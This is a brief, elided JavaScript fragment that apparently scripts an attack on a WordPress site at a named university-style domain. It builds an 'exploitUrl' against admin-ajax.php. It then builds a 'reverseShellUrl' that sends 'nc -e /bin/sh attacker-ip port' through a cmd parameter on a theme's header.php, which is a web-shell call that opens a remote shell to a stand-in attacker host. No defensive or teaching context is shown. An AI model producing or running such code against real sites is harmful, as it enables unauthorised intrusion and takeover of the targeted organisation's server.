...
const exploitUrl = 'http://alshaab.edu.iq/wp-admin/admin-ajax.php?action=rest_core_controller_create_item&collection_name=avatars';
...
.then(data => {
    ...
    const reverseShellUrl = `http://alshaab.edu.iq/wp-content/themes/twentytwenty/header.php?cmd=${encodeURIComponent('nc -e /bin/sh attacker-ip port')}`;
